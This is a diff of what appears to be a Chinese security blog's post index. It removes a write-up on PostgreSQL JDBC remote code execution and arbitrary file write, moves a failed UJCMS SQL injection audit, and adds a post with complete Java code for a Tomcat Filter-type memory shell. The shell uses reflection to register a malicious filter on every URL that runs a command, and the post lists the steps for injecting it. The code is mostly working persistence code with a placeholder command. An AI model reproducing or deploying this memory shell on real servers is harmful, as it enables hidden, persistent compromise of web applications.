-<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>首先我们创建一个MAVEN项目，然后引入相关的依赖：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5ced078929b993db8057524c1e367ab0.png" alt="在这里插入图片描述"><br>然后编写一个漏洞利用POC。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/32449109031c3fc2a331e246a6cacf49.png" alt="在这里插入图片描述"><br>很明显导致漏洞的是jdbcURL的socketFactory与socketFactoryArg这两个参数，在jdbcURL的定义中，参数部分一般被称作扩展参数，其总用是指定连接数据库的一些特性。大胆cancel导致漏洞的就是这两个参数，而这个漏洞的kick-off就是DriverManager.getConnection这个类方法。那么我们接下来要做的就是不断跟踪这个函数的Chain最终找到sink点。直接开干，毫无疑问我们要使用调试模式将代码跑起来，然后键入到getConnection函数里面。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/064c6d4ca7a7331a6e695e5d01c6a6d2.png" alt="在这里插入图片描述"><br>无意义的部分我就直接放图片了，需要关注的地方我会说明<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7392fcc25dc3f316af36782dc20f0293.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/ccbaeb08422697f7a4fb4670f23057dd.png" alt="在这里插入图片描述"><br>这里注意注意第151行</p>
-<blockquote>
-<p>this.setupLoggerFromProperties(props);</p>
-</blockquote>
-<p>这与我们的任意文件写入有关，当然现在我们不关注他，这个时候我们可以看一下props的值<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ab3aaf9cdbd7f4e7a764c52c68ff5b62.png" alt="在这里插入图片描述"><br>存储的都是jdbcRUL含有的一些关键信息，具体的实现步骤我当然是一步一步看了的，有新区的可以自己看看。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d9714883310a8c2d83f1b6538fcdf8b6.png" alt="在这里插入图片描述"></p>
-<p><img src="https://i-blog.csdnimg.cn/blog_migrate/9c41a90e6a0b2680b1ba52b62aa8cff6.png" alt="在这里插入图片描述"><br>这里对props进行了处理，最终生成的是一个hostSpecs类型的数组，hostSpecs对象存储了数据库连接的hostnae, port以及一个扩展参数localSocketAddress，<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8e662319025a149bd51fcb4a54792ca8.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/371c3ab18de2f8e22781466536dc56e4.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/dd9ed18eb4931c726f21b622b0886322.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/6ac4cbac510fe44fe69ab979e601d56d.png" alt="在这里插入图片描述"><br>这个时候可以看一波这个info存储的信息了<br><img src="https://i-blog.csdnimg.cn/blog_migrate/403ae02a564320dedc0f27f2c54d2a05.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/df2ae255020b698ba90dea5bf60ce140.png" alt="在这里插入图片描述"><br>这里注意第三个参数<code>PGProperty.SOCKET_FACTORY_ARG</code>，PGProperty是一个枚举类型，其内部定义了get方法，实现的功能是对判断枚举项的值有没有在传入的properties中，如果在则查找返回，如果不在则返回默认值。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7ce33e988bcb94a35fd158b484e500f9.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/1a4f33fffdfd9632bb4a02a46150e3ae.png" alt="在这里插入图片描述"><br>可以看到有很多的枚举项，这些内容很大一部分都是JDBC的扩展参数的可选值。<br>在我们的代码中这个值就是<code>args</code>也就是我们最开始poc设置的参数<code>socketFactoryArg</code><br>还可以看一看第一个参数的值<br><img src="https://i-blog.csdnimg.cn/blog_migrate/56340d55a62456873cb62038ab7c52f3.png" alt="在这里插入图片描述"><br>就是最开始设置的参数<code>socketFactoryClass</code><br>然后跟进这个函数<code>instantiate</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/90be4014a268634cde7e700a2425fda1.png" alt="在这里插入图片描述"><br>很明显的反射调用，第一个参数作为类名，第三个参数作为构造方法的参数，那么这个函数<code>ObjectFactory.instantiate</code>就是我们的sink点了。<br>现在我们要找到一个gadget能够在在类实例化的过程中实现RCE，作者根据jackson的历史漏洞<code>CVE-2017-17485</code>找到这么一个类<br><code>org.springframework.context.support.ClassPathXmlApplicationContext</code> 该类在实例化的时候会下载出入的参数指定的xml文件然后获取java bean，然后通过jpel表达式执行恶意代码。<br>完整的poc长这样<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2281dffccbdcbb3e7ef26beb6c41b4d6.png" alt="在这里插入图片描述"><br>当然过去jdbc连接的用户名根本不用填，根本用不上。<br>xml文件长这样：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d32339c5218d29b8d0b34a29ee52d131.png" alt="在这里插入图片描述"><br>然后直接运行代码<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f5ff4c93c580108a6d0240e6a85db852.png" alt="在这里插入图片描述"><br>完美</p>
-<h1 id="任意文件写"><a href="#任意文件写" class="headerlink" title="任意文件写"></a>任意文件写</h1><p>这个也比较简单，上面有提到过，重点在<code>this.setupLoggerFromProperties(props);</code>里面设置了日志处理器，在调用该logger的时候就会使用该处理器将日志记录到指定的日志文件中。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2163e134a61bb522243e3e445f0eeca2.png" alt="在这里插入图片描述"><br>这里注意要设置jdbc扩展参数<code>logger_level</code>设置日志记录的级别，当然不能为off，<br><img src="https://i-blog.csdnimg.cn/blog_migrate/829303d5d04f95aadbb7c8cb22f66df3.png" alt="在这里插入图片描述"><br>设置扩展参数<code>logger_file</code>指定日志文件的路径，这里没有对路径进行过滤，所以可以进行目录穿越，将文件指定到想要的位置。</p>
-<p><img src="https://i-blog.csdnimg.cn/blog_migrate/763faa16a6ecaf5bf292864d963eb372.png" alt="在这里插入图片描述"><br>这个文件处理器最终被添加到了<code>Parent_LOGGER</code>这个日志记录器中<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a9a2b6ea66b5222132b9b34ef86ba49e.png" alt="在这里插入图片描述"><br>在执行完<code>setupLoggerFromProperties(props)</code>后，马上就有记录日志的操作，该操作将整个jdbcUrl记录到日志中。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/10dcb0eb1dd3852c53c60fd860fbd202.png" alt="在这里插入图片描述"><br>注意到这里的日志记录器并不是<code>PARENT_LOGGER</code>而是<code>LOGGER</code>，那么他是怎么调用到父记录器的呢，这个可以自己跟一下log的流程看一下怎么获取的，最终的poc与效果<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1f0bd72347a1eb74e185be6a2a08c8f9.png" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>漏洞分析</category>
-      </categories>
-      <tags>
-        <tag>任意文件写</tag>
-        <tag>Postgre</tag>
-        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -1540,6 +1540,21 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </categories>
       <tags>
         <tag>tomcat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一次失败的JAVA代码审计-SQL注入</title>
+    <url>/archives/b8d90c0d.html</url>
+    <content><![CDATA[<p>本次审计的CMS系统为UJCMS最新版。立足于我现在的审计水平暂时是没有发现该系统的漏洞的，拉胯。本来今天晚上跟一个SQL注入的点跟的本来都要大功告成了，结果被当头棒喝，学会了什么叫人生的参差。废话不多说直接开干。<br>直接在整个项目中搜索关键字 <code>order by $&#123;</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/82739f44b0d9fd7572daa223c583c0be.png" alt="在这里插入图片描述"><br>那么如果这个<code>queryInfo.orderBy</code>可控的话就皆大欢喜了，目前来看有很大机会<br><img src="https://i-blog.csdnimg.cn/blog_migrate/46b91c4c867dea6874e9f5b174651dd2.png" alt="在这里插入图片描述"><br>这里注意到order by 是在一条id为<code>Select_ALL</code>的语句中，对应的<code>mybatis</code>文件名为<code>SeqMapper.xml</code>，最开始的时候我就去找对应名称的<code>DAO</code>层实现类，结果一直没有找到。最后迫不得已直接来了个全局搜索<br><img src="https://i-blog.csdnimg.cn/blog_migrate/254a328e59662d472abdba7abd98d13f.png" alt="在这里插入图片描述"><br>注意到<code>Select_ALL</code>出现在其他的<code>mybatis</code>映射文件的<code>include</code> 标签里，这个标签就和php里的include或者require一个功能，用作代码复用。那么我们随便进入一个<code>mapper.xml</code>，这里以<code>Article.mapper</code>为例。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/82b1150a5d9c2d9bc9318d3b99103b37.png" alt="在这里插入图片描述"><br>这里的sql语句id为<code>selectAll</code>，返回值类型为<code>ResultMap</code>，然后找到对应的<code>DAO</code>层实现类<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4ab6fbb786f6ba96f10eb785e26d3065.png" alt="在这里插入图片描述"><br>注意到这里是个接口而不是实现类，这是因为<code>@Mapper  @Repository</code> 这两个注解的功劳@Mapper可以使接口在编译时自动生成器实现类，@Repositry注解帮助实现自动注入。然后就是取找对应的<code>Services</code>层，这里也是去找对应文件名，不出意外是<code>ArticleService.java</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/8f4a52e3de92113b3c20724aa72956ae.png" alt="在这里插入图片描述"><br>看到这里注入了<code>AticleMapper</code>，然后在在当前文件搜索哪里调用了<code>selectAll</code>方法<br><img src="https://i-blog.csdnimg.cn/blog_migrate/518c76667202e3f11ddd6ca906bff8e8.png" alt="在这里插入图片描述"><br>然后就是找对应的控制器<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e1897c2399c77c6629719e39e9d52bf5.png" alt="在这里插入图片描述"><br>这么多，根据命名的规则，我们直接进入<code>ArticleController</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/1ee837af9def4c318f55e9699ea9b466.png" alt="在这里插入图片描述"><br>然后搜索有没有调用<code>AritcleService.selectAll</code>方法的语句，一搜，啪，没有咋整，不要换，在回去<code>ArticleService</code>里面看看有没有类本地的调用<br><img src="https://i-blog.csdnimg.cn/blog_migrate/718dab1f95329a3b947da5e612dda9c8.png" alt="在这里插入图片描述"><br><code>selectList</code>方法调用了，再回到<code>ArticleController</code>看看有没有调用<code>selectList</code>方法<br><img src="https://i-blog.csdnimg.cn/blog_migrate/99ef6f21f07c0a3b05bf5d4b44cbbc79.png" alt="在这里插入图片描述"><br>这儿调用了，对应的路由为<code>/api/article</code><br>然后就是看参数是否可控了，这里我么你可以控制的参数有三个，分别是<code>params,queryMap,customsQueryMap</code><br>看看这三个参数怎么来的，跟到对应的query函数<br><img src="https://i-blog.csdnimg.cn/blog_migrate/bbf42a23df56077d010c3608e991ad8e.png" alt="在这里插入图片描述"><br>在<code>query</code>函数中为上述三个参数赋值，<code>params</code>来自客户端传的参，<code>queryMap</code>与<code>customsMap</code>同样来自于客户端传的参，不过有要求，参数中前缀为<code>Q_</code>的参数会被添加到<code>queryMap</code>，前缀为<code>custom</code>的参数会被添加到<code>customsMap</code>中，然后调用<code>ArticleListDirective.assemble</code>对<code>queryMap</code>参数进行处理，跟进去看看<br>该函数前面都不重要，直到最后一条语句<br><img src="https://i-blog.csdnimg.cn/blog_migrate/714c1936bd2e7b019ab31c6801599133.png" alt="在这里插入图片描述"><br>这里就有处理<code>orderBy</code>了，注意到有一个默认值，如果搞不好就得使用这个默认值，我们当然是不想的。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e487e7b309c50c8a857d125af9804d8f.png" alt="在这里插入图片描述"><br>调用<code>getString</code>函数进行处理，然后把结果添加到<code>queryMap</code>中，跟进<code>getString</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/4335735042134ca1845e7eadff1f535b.png" alt="在这里插入图片描述"><br>重点来了，敲黑板，要考，注意到如果value为空则使用默认值，不为空则使用从param中获取的值，简直皆大欢喜啊。。。。<br>这时候我们只需要传参<code>orderBy=xxxx</code>就可以控制value的值了，简直完美，然后接着往下走。接下来queryMap会被传入到<code>selectList</code>函数<br><img src="https://i-blog.csdnimg.cn/blog_migrate/afb5e6d4b004c18036df1cfa52cb0846.png" alt="在这里插入图片描述"><br>然后传入<code>selectAll</code> 然后mybatis从queryInfo中获取到orderBy的值，然后拼接到sql语句中，注入完成，于是我就试了下，然后就报错了。。。。。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6ed045dfdeee0302e085577626fa6481.png" alt="在这里插入图片描述"></p>
+<p>哦豁，白名单，完蛋。到这里基本上就失败了，不过我们还要去看一看怎么拦的，这里报错注意到是在<code>QueryParser</code>解析的时候限制了白名单，最后定位到这里<br><img src="https://i-blog.csdnimg.cn/blog_migrate/791ada2e53ee84118d82feb21c5eb9b0.png" alt="在这里插入图片描述"><br>跟进去<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3768c9c3ce96f2e60702fe9c3fe0c8dd.png" alt="在这里插入图片描述"><br>继续到parse函数最后一行<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4e6fda6669c7b46c6f08dfdf4aebf804.png" alt="在这里插入图片描述"><br>跟进<code>parseOrderBy</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/99806a2b16e0e7ea3777e19f7029ae2f.png" alt="在这里插入图片描述"><br>他妈的，我一眼就注意到这里的<code>preventInjection</code>，进去看看<br><img src="https://i-blog.csdnimg.cn/blog_migrate/aa41d49a6862016da9fcd45c4a4784b8.png" alt="在这里插入图片描述"><br>。。。。根源在这里</p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -1735,21 +1750,6 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       <tags>
         <tag>代码审计</tag>
         <tag>RMI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>一次失败的JAVA代码审计-SQL注入</title>
-    <url>/archives/b8d90c0d.html</url>
-    <content><![CDATA[<p>本次审计的CMS系统为UJCMS最新版。立足于我现在的审计水平暂时是没有发现该系统的漏洞的，拉胯。本来今天晚上跟一个SQL注入的点跟的本来都要大功告成了，结果被当头棒喝，学会了什么叫人生的参差。废话不多说直接开干。<br>直接在整个项目中搜索关键字 <code>order by $&#123;</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/82739f44b0d9fd7572daa223c583c0be.png" alt="在这里插入图片描述"><br>那么如果这个<code>queryInfo.orderBy</code>可控的话就皆大欢喜了，目前来看有很大机会<br><img src="https://i-blog.csdnimg.cn/blog_migrate/46b91c4c867dea6874e9f5b174651dd2.png" alt="在这里插入图片描述"><br>这里注意到order by 是在一条id为<code>Select_ALL</code>的语句中，对应的<code>mybatis</code>文件名为<code>SeqMapper.xml</code>，最开始的时候我就去找对应名称的<code>DAO</code>层实现类，结果一直没有找到。最后迫不得已直接来了个全局搜索<br><img src="https://i-blog.csdnimg.cn/blog_migrate/254a328e59662d472abdba7abd98d13f.png" alt="在这里插入图片描述"><br>注意到<code>Select_ALL</code>出现在其他的<code>mybatis</code>映射文件的<code>include</code> 标签里，这个标签就和php里的include或者require一个功能，用作代码复用。那么我们随便进入一个<code>mapper.xml</code>，这里以<code>Article.mapper</code>为例。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/82b1150a5d9c2d9bc9318d3b99103b37.png" alt="在这里插入图片描述"><br>这里的sql语句id为<code>selectAll</code>，返回值类型为<code>ResultMap</code>，然后找到对应的<code>DAO</code>层实现类<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4ab6fbb786f6ba96f10eb785e26d3065.png" alt="在这里插入图片描述"><br>注意到这里是个接口而不是实现类，这是因为<code>@Mapper  @Repository</code> 这两个注解的功劳@Mapper可以使接口在编译时自动生成器实现类，@Repositry注解帮助实现自动注入。然后就是取找对应的<code>Services</code>层，这里也是去找对应文件名，不出意外是<code>ArticleService.java</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/8f4a52e3de92113b3c20724aa72956ae.png" alt="在这里插入图片描述"><br>看到这里注入了<code>AticleMapper</code>，然后在在当前文件搜索哪里调用了<code>selectAll</code>方法<br><img src="https://i-blog.csdnimg.cn/blog_migrate/518c76667202e3f11ddd6ca906bff8e8.png" alt="在这里插入图片描述"><br>然后就是找对应的控制器<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e1897c2399c77c6629719e39e9d52bf5.png" alt="在这里插入图片描述"><br>这么多，根据命名的规则，我们直接进入<code>ArticleController</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/1ee837af9def4c318f55e9699ea9b466.png" alt="在这里插入图片描述"><br>然后搜索有没有调用<code>AritcleService.selectAll</code>方法的语句，一搜，啪，没有咋整，不要换，在回去<code>ArticleService</code>里面看看有没有类本地的调用<br><img src="https://i-blog.csdnimg.cn/blog_migrate/718dab1f95329a3b947da5e612dda9c8.png" alt="在这里插入图片描述"><br><code>selectList</code>方法调用了，再回到<code>ArticleController</code>看看有没有调用<code>selectList</code>方法<br><img src="https://i-blog.csdnimg.cn/blog_migrate/99ef6f21f07c0a3b05bf5d4b44cbbc79.png" alt="在这里插入图片描述"><br>这儿调用了，对应的路由为<code>/api/article</code><br>然后就是看参数是否可控了，这里我么你可以控制的参数有三个，分别是<code>params,queryMap,customsQueryMap</code><br>看看这三个参数怎么来的，跟到对应的query函数<br><img src="https://i-blog.csdnimg.cn/blog_migrate/bbf42a23df56077d010c3608e991ad8e.png" alt="在这里插入图片描述"><br>在<code>query</code>函数中为上述三个参数赋值，<code>params</code>来自客户端传的参，<code>queryMap</code>与<code>customsMap</code>同样来自于客户端传的参，不过有要求，参数中前缀为<code>Q_</code>的参数会被添加到<code>queryMap</code>，前缀为<code>custom</code>的参数会被添加到<code>customsMap</code>中，然后调用<code>ArticleListDirective.assemble</code>对<code>queryMap</code>参数进行处理，跟进去看看<br>该函数前面都不重要，直到最后一条语句<br><img src="https://i-blog.csdnimg.cn/blog_migrate/714c1936bd2e7b019ab31c6801599133.png" alt="在这里插入图片描述"><br>这里就有处理<code>orderBy</code>了，注意到有一个默认值，如果搞不好就得使用这个默认值，我们当然是不想的。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e487e7b309c50c8a857d125af9804d8f.png" alt="在这里插入图片描述"><br>调用<code>getString</code>函数进行处理，然后把结果添加到<code>queryMap</code>中，跟进<code>getString</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/4335735042134ca1845e7eadff1f535b.png" alt="在这里插入图片描述"><br>重点来了，敲黑板，要考，注意到如果value为空则使用默认值，不为空则使用从param中获取的值，简直皆大欢喜啊。。。。<br>这时候我们只需要传参<code>orderBy=xxxx</code>就可以控制value的值了，简直完美，然后接着往下走。接下来queryMap会被传入到<code>selectList</code>函数<br><img src="https://i-blog.csdnimg.cn/blog_migrate/afb5e6d4b004c18036df1cfa52cb0846.png" alt="在这里插入图片描述"><br>然后传入<code>selectAll</code> 然后mybatis从queryInfo中获取到orderBy的值，然后拼接到sql语句中，注入完成，于是我就试了下，然后就报错了。。。。。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6ed045dfdeee0302e085577626fa6481.png" alt="在这里插入图片描述"></p>
-<p>哦豁，白名单，完蛋。到这里基本上就失败了，不过我们还要去看一看怎么拦的，这里报错注意到是在<code>QueryParser</code>解析的时候限制了白名单，最后定位到这里<br><img src="https://i-blog.csdnimg.cn/blog_migrate/791ada2e53ee84118d82feb21c5eb9b0.png" alt="在这里插入图片描述"><br>跟进去<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3768c9c3ce96f2e60702fe9c3fe0c8dd.png" alt="在这里插入图片描述"><br>继续到parse函数最后一行<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4e6fda6669c7b46c6f08dfdf4aebf804.png" alt="在这里插入图片描述"><br>跟进<code>parseOrderBy</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/99806a2b16e0e7ea3777e19f7029ae2f.png" alt="在这里插入图片描述"><br>他妈的，我一眼就注意到这里的<code>preventInjection</code>，进去看看<br><img src="https://i-blog.csdnimg.cn/blog_migrate/aa41d49a6862016da9fcd45c4a4784b8.png" alt="在这里插入图片描述"><br>。。。。根源在这里</p>
-]]></content>
-      <categories>
-        <category>漏洞分析</category>
-        <category>代码审计</category>
-      </categories>
-      <tags>
-        <tag>代码审计</tag>
-        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -2032,6 +2032,35 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
+    <title>手写一个Tomcat Filter类型内存马</title>
+    <url>/archives/f0f0aa4f.html</url>
+    <content><![CDATA[<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//            获取StandardContext对象</span></span><br><span class="line">            System.out.println(<span class="string">&quot;获取StandardContext对象&quot;</span>);</span><br><span class="line"><span class="comment">//            Field request = req.getClass().getDeclaredField(&quot;request&quot;);</span></span><br><span class="line"><span class="comment">//            request.setAccessible(true);</span></span><br><span class="line"><span class="comment">//            Request request1 = (Request) request.get(request);</span></span><br><span class="line"><span class="comment">//            StandardContext context1 = (StandardContext) request1.getContext();</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext1</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            context = ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context2</span> <span class="operator">=</span> ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext1);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">context1</span> <span class="operator">=</span> (StandardContext) context2.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">//            将EvilFilter添加到FilterDef</span></span><br><span class="line">            System.out.println(<span class="string">&quot;将EvilFilter添加到FilterDef&quot;</span>);</span><br><span class="line">            <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">             <span class="type">Filter</span> <span class="variable">evilFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>()&#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">                    chain.doFilter(request, response);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="meta">@Override</span></span><br><span class="line">                 <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"><span class="comment">//                     init方法必须写，不然会报错</span></span><br><span class="line">                 &#125;</span><br><span class="line"></span><br><span class="line">                 <span class="meta">@Override</span></span><br><span class="line">                 <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//                    destory方法必须写，不然会报错</span></span><br><span class="line"></span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;;</span><br><span class="line">            filterDef.setFilter(evilFilter);</span><br><span class="line">            <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;evil&quot;</span>;</span><br><span class="line">            filterDef.setFilterName(filterName);</span><br><span class="line">            filterDef.setFilterClass(evilFilter.getClass().getName());</span><br><span class="line">            <span class="comment">//将FilterDef添加到FilterDefs</span></span><br><span class="line">            System.out.println(<span class="string">&quot;将FilterDef添加到FilterDefs&quot;</span>);</span><br><span class="line">            context1.addFilterDef(filterDef);</span><br><span class="line"><span class="comment">//            获取filterConfig并添加到filterConfigs</span></span><br><span class="line">            System.out.println(<span class="string">&quot;获取filterConfig并添加到filterConfigs&quot;</span>);</span><br><span class="line">            Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">            declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//            System.out.println(1);</span></span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> declaredConstructor.newInstance(context1, filterDef);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            filterConfigs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//            System.out.println(2);</span></span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) filterConfigs.get(context1);</span><br><span class="line">            map.put(filterName, applicationFilterConfig);</span><br><span class="line"><span class="comment">//            将filterMap添加到StandardContext</span></span><br><span class="line">            System.out.println(<span class="string">&quot;将filterMap添加到StandardContext&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">            filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">            filterMap.setFilterName(filterName);</span><br><span class="line">            filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">            context1.addFilterMapBefore(filterMap);</span><br><span class="line">            System.out.println(<span class="string">&quot;内存马注入成功&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>要实现一个Filter类型的内存马，必要要完成以下的步骤</p>
+<ul>
+<li>获取StandardContext对象</li>
+<li>写一个恶意FIlter</li>
+<li>将恶意Filter加入到FilterDef中</li>
+<li>将FIlterDef加入到FilterDefs中</li>
+<li>将FilterDefs封装到FilterConfig中</li>
+<li>将FilterCOnfig封装到FilterConfigs中</li>
+<li>添加FIlter Parttern</li>
+</ul>
+<p>首先要获取Standard对象<br>利用IDEA的Evaluate工具我们可以知道req.getSession().getServletContext()的执行结果是一个ApplicationContextFacade对象，在其中有一个Context属性为APplicationContext类型的对象，这个APplicationContext类型的对象中有有一个属性context为StrandardContext类型的对象，也就是我们需要的。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b4d18b39f0e89dee214586de0bf6155c.png" alt="在这里插入图片描述"><br>所以我们利用两次反射就可以获取到该StandardContext对象</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext1</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">context = ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">context.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">context2</span> <span class="operator">=</span> ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">context2.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext1);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context1</span> <span class="operator">=</span> (StandardContext) context2.get(applicationContext);</span><br></pre></td></tr></table></figure>
+<p>还有另一种获取到StandardContext对象的方式，可以直接通过request对象获取</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">request</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">request.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) request.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context1</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br></pre></td></tr></table></figure>
+<p>嗯，就这么多想说的，后面的看代码就好了，主要就是按照上面的步骤来注入就行了，这里注意恶意的Filter类必须显式的重写init与destory方法，否则你会发现怎么都注入不成功，当然这都是我踩过的坑，浪费了我很多时间。。。</p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>tomcat</tag>
+        <tag>内存马</tag>
+        <tag>filter</tag>
+      </tags>
+  </entry>
